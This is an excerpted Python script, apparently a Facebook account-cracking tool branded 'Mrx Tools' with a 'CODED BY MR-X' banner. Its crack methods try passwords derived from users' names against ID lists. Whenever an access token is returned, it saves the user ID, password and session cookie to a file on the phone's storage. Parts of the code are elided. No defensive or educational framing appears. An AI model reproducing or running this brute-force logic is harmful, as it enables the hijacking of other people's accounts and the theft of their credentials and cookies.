...
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] Mrx Tools is started soon plz wait ....')
try:
    import requests 
except ImportError:
...
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝    
     ...
     ┌───────────────────────────────────────┐
     │ \033[34;1m[💸] CODED BY : MR-X\033[34;1m                  │
     │ \033[34;1m[💸] GITHUB   : MR-X-OWNER\033[34;1m            │
     │\033[34;1m [💸] Telegram : MR_X_Owner\033[34;1m            │
     │ \033[34;1m[💸] VERSION  : A.4\033[34;1m                   │
     │ \033[34;1m[💸] HACKED   : Mr.X Owner \033[34;1m           │
     └───────────────────────────────────────┘""")
def linex():
	print(50*'_')
def clear():
...
def menu():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://www.facebook.com/moinulislam880');menu()
    elif select =='0':
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/Mrx.txt');linex()
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            ...
            sys.stdout.write(f"\r{G1}[{A}MRX-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}MRX-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}MR-X-OWNER{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            ...
            if 'access_token' in q:
                ...
                open('/sdcard/MRX-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(uid)
                break
            else:continue
        loop+=1
